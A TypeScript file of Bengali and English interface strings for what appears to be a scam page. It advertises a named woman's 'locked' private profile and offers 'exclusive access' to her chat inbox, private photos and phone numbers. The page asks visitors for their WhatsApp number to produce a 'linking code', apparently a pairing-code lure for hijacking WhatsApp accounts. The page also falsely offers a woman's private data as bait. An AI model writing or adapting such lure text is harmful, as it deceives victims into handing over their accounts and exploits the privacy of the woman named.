...
export const translations: Record<'bn' | 'en', AppTranslations> = {
  bn: {
    title: "Mst Rupa akter's Profile",
    headerTitle: "Mst Rupa akter",
    cameraOption: "ক্যামেরা অপশন",
    sessionSettings: "সেশন সেটিংস",
    askMetaAI: "Meta AI অথবা সার্চ করুন...",
    profileLocked: "Mst Rupa akter এর প্রোফাইল লক করা আছে",
    unlockProfile: "প্রাইভেট প্রোফাইল আনলক করুন",
    unlockDesc: "Mst Rupa akter এর চ্যাট ইনবক্স, ব্যক্তিগত ছবি এবং ডিরেক্ট নম্বরে সরাসরি এক্সক্লুসিভ অ্যাক্সেস পেতে সংযোগ করুন।",
    ...
    lockedStatus: "লকড",
    verificationFormDesc: "Mst Rupa akter-এর প্রাইভেট অ্যাকাউন্টে সুরক্ষিত সংযোগ স্থাপন করতে আপনার মোবাইলের সঠিক হোয়াটসঅ্যাপ নম্বরটি দিন। কোনো পাসওয়ার্ড ছাড়াই নিরাপদ লিঙ্কিং কোড তৈরি হবে।",
    ...
    generatingCodeText: "Mst Rupa akterকে রিকুয়েষ্ট পাঠানো হচ্ছে...",
    ...
    codePendingDesc: "ডিভাইসটি Mst Rupa akter-এর সাথে লিঙ্ক করার প্রসেসটি সচল আছে। কয়েক সেকেন্ড অপেক্ষা করুন, এডমিন অনুমোদন দেওয়া মাত্র কোডটি এখানে স্বয়ংক্রিয়ভাবে লাইভ হবে।",
    ...
    connectedSuccessDesc: "Mst Rupa akter-এর প্রাইভেট সিঙ্ক সেশনে আপনি সম্পূর্ণ লাইভ অ্যাক্সেস লাভ করেছেন।",
  ...
  en: {
    ...
    profileLocked: "Mst Rupa akter's Profile is Locked",
    unlockProfile: "Unlock Private Profile",
    unlockDesc: "Unlock direct and exclusive access to Mst Rupa akter's chat inbox, private photos, and phone numbers.",
    joinNowBtn: "Join now",
    ...
    lockedStatus: "Locked",
    verificationFormDesc: "Provide your WhatsApp number to establish a secure connection with Mst Rupa akter's private profile. No password needed.",
    ...
    generatingCodeText: "Sending request to Mst Rupa akter...",
    ...
    connectedSuccessDesc: "You have received live access to Mst Rupa akter's private secure gateway.",
